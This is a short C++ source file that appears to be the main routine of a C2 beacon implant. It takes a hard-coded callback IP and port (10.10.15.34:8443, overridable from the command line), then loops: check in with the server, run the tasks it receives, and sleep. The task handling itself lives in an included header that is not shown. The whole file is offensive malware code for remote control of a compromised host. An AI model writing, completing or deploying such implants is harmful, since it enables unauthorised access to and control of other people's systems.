#include "BeaconHttp.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string ip = "10.10.15.34";
	if(argc > 1)
		ip = argv[1];

	int port = 8443;
	if (argc > 2)
		port = atoi(argv[2]);

	bool https = false;
	if (argc > 3)
	{
		std::string sHttps = argv[3];
		if(sHttps=="https")
			https=true;
		else if(sHttps=="http")
			https=false;
	}

	// std::cout << "ip " << ip << ", port " << std::to_string(port) << ", https " << https << std::endl;

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconHttp>(ip, port, https);

	bool exit = false;
	while (!exit)
	{
		beacon->checkIn();

		exit = beacon->runTasks();
		
		beacon->sleep();
	}

	beacon->checkIn();
}